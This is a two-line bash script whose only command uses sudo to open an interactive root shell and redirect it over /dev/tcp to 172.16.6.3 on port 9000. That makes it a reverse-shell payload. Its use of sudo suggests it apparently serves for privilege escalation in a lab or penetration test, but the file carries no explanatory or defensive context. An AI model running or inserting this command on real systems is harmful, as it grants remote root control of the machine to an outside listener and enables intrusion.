#!/bin/bash
sudo bash -c "bash -i >& /dev/tcp/172.16.6.3/9000 0>&1"
